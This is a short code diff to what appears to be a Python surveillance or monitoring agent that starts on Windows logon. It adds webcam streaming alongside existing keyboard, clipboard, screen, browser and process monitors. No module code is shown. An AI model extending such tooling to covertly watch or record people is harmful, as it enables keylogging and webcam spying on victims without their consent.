@@ -9,6 +9,7 @@ from modules.browser_monitor import BrowserMonitor
 from modules.process_monitor import ProcessMonitor
 from modules.keyboard_monitor import KeyboardMonitor
 from modules.clipboard_monitor import ClipboardMonitor
+from modules.webcam_stream import WebcamStream
 
 async def main():
     # Register to start automatically on Windows logon
@@ -24,6 +25,7 @@ async def main():
     # Instantiate modules
     heartbeat = Heartbeat(client)
     screen_stream = ScreenStream(client)
+    webcam_stream = WebcamStream(client)
     active_window = ActiveWindow(client)
     browser_monitor = BrowserMonitor(client)
     process_monitor = ProcessMonitor(client)
@@ -39,6 +41,7 @@ async def main():
     # Start all monitor modules
     heartbeat.start()
     screen_stream.start()
+    webcam_stream.start()
     active_window.start()
     browser_monitor.start()
     process_monitor.start()
@@ -62,6 +65,7 @@ async def main():
         # Stop all monitoring tasks cleanly
         heartbeat.stop()
         screen_stream.stop()
+        webcam_stream.stop()
         active_window.stop()
         browser_monitor.stop()
         process_monitor.stop()
